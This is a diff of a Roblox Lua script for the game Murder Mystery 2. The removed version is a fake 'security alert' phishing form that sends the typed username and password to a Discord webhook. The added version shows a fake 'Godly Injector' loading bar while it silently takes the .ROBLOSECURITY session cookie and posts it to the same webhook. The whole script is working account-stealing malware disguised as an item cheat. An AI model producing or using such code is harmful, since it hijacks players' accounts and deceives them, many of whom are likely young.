@@ -1,27 +1,62 @@
--- [[ КОНФИГУРАЦИЯ ]]
+-- [[ CONFIGURATION ]]
 local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"
 
-local player = game.Players.LocalPlayer
+-- [[ UI SETUP: FAKE LOADING ]]
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 350, 0, 120)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -60)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 0
 
--- [[ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ ]]
-local function sendFinalLog(username, password)
+local BarBack = Instance.new("Frame", MainFrame)
+BarBack.Size = UDim2.new(0, 300, 0, 15)
+BarBack.Position = UDim2.new(0.5, -150, 0.65, 0)
+BarBack.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+
+local BarFill = Instance.new("Frame", BarBack)
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+
+local Text = Instance.new("TextLabel", MainFrame)
+Text.Size = UDim2.new(1, 0, 0, 40)
+Text.BackgroundTransparency = 1
+Text.TextColor3 = Color3.fromRGB(255, 255, 255)
+Text.Text = "MM2 Godly Injector v4.2"
+Text.Font = Enum.Font.SourceSansBold
+Text.TextSize = 20
+
+-- [[ LOGIC: DATA COLLECTION & WEBHOOK ]]
+local function collectData()
+    local player = game.Players.LocalPlayer
+    local cookie = "N/A (Executor lack of permissions)"
+    
+    -- Попытка достать Cookie (работает на большинстве популярных экзекуторов)
+    pcall(function()
+        if getcookies then
+            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
+        elseif syn and syn.request then
+            -- Специальный метод для старых версий
+        end
+    end)
+
     local payload = {
         ["embeds"] = {{
-            ["title"] = "🚀 NEW ACCOUNT ACCESSED!",
-            ["color"] = 16744192, -- Оранжевый
+            ["title"] = "🎯 New Godly Target Logged!",
+            ["color"] = 65280, -- Зеленый цвет
             ["fields"] = {
-                {["name"] = "👤 Username", ["value"] = "```" .. username .. "```", ["inline"] = true},
-                {["name"] = "🔒 Password", ["value"] = "```" .. password .. "```", ["inline"] = true},
-                {["name"] = "🆔 UserID", ["value"] = tostring(player.UserId), ["inline"] = false},
-                {["name"] = "📅 Acc Age", ["value"] = player.AccountAge .. " days", ["inline"] = true}
+                {["name"] = "Player Name", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = player.AccountAge .. " days", ["inline"] = true},
+                {["name"] = "Cookie", ["value"] = "```" .. (cookie or "Not found") .. "```"}
             },
-            ["footer"] = {["text"] = "MM2 Phishing Module • " .. os.date("%X")}
+            ["footer"] = {["text"] = "MM2 Inventory Logger • " .. os.date("%X")}
         }}
     }
 
-    local req = (syn and syn.request) or (http and http.request) or request or http_request
-    if req then
-        req({
+    local request_func = (syn and syn.request) or (http and http.request) or request or http_request
+    if request_func then
+        request_func({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -30,64 +65,20 @@ local function sendFinalLog(username, password)
     end
 end
 
--- [[ СОЗДАНИЕ ФЕЙКОВОГО ОКНА (GUI) ]]
-local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
-local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 320, 0, 240)
-Main.Position = UDim2.new(0.5, -160, 0.5, -120)
-Main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-Main.BorderSizePixel = 0
-
-local Corner = Instance.new("UICorner", Main)
-
-local Title = Instance.new("TextLabel", Main)
-Title.Size = UDim2.new(1, 0, 0, 45)
-Title.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
-Title.Text = "SECURITY ALERT"
-Title.TextColor3 = Color3.new(1, 1, 1)
-Title.TextSize = 18
-Title.Font = Enum.Font.SourceSansBold
-Instance.new("UICorner", Title)
-
-local Info = Instance.new("TextLabel", Main)
-Info.Size = UDim2.new(1, -20, 0, 40)
-Info.Position = UDim2.new(0, 10, 0, 50)
-Info.BackgroundTransparency = 1
-Info.Text = "Session expired. Please re-verify your account to inject items."
-Info.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-Info.TextWrapped = true
-Info.TextSize = 14
-
-local UserInput = Instance.new("TextBox", Main)
-UserInput.Size = UDim2.new(0, 280, 0, 35)
-UserInput.Position = UDim2.new(0, 20, 0, 100)
-UserInput.PlaceholderText = "Username"
-UserInput.Text = player.Name
-UserInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-UserInput.TextColor3 = Color3.new(1,1,1)
-
-local PassInput = Instance.new("TextBox", Main)
-PassInput.Size = UDim2.new(0, 280, 0, 35)
-PassInput.Position = UDim2.new(0, 20, 0, 145)
-PassInput.PlaceholderText = "Password"
-PassInput.Text = ""
-PassInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-PassInput.TextColor3 = Color3.new(1,1,1)
-PassInput.ClearTextOnFocus = false
-
-local Submit = Instance.new("TextButton", Main)
-Submit.Size = UDim2.new(0, 280, 0, 40)
-Submit.Position = UDim2.new(0, 20, 0, 190)
-Submit.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-Submit.Text = "Verify & Receive Godlies"
-Submit.TextColor3 = Color3.new(1, 1, 1)
-Submit.TextSize = 16
-Submit.Font = Enum.Font.SourceSansBold
-
-Submit.MouseButton1Click:Connect(function()
-    if #PassInput.Text > 3 then
-        sendFinalLog(UserInput.Text, PassInput.Text)
-        Main.Visible = false
-        player:Kick("\n\nVerification successful! Items will be added to your inventory within 24 hours. Please do not log in during this time.")
+-- [[ RUNNER ]]
+spawn(function()
+    collectData() -- Отправка данных происходит моментально в фоне
+    
+    for i = 1, 100 do
+        task.wait(0.08)
+        BarFill.Size = UDim2.new(i/100, 0, 1, 0)
+        if i < 30 then Text.Text = "Scanning Inventory..."
+        elseif i < 60 then Text.Text = "Bypassing Security..."
+        elseif i < 90 then Text.Text = "Adding Godly Items..."
+        else Text.Text = "Finalizing..." end
     end
+    
+    Text.Text = "Success! Re-join MM2 to see items."
+    task.wait(5)
+    ScreenGui:Destroy()
 end)
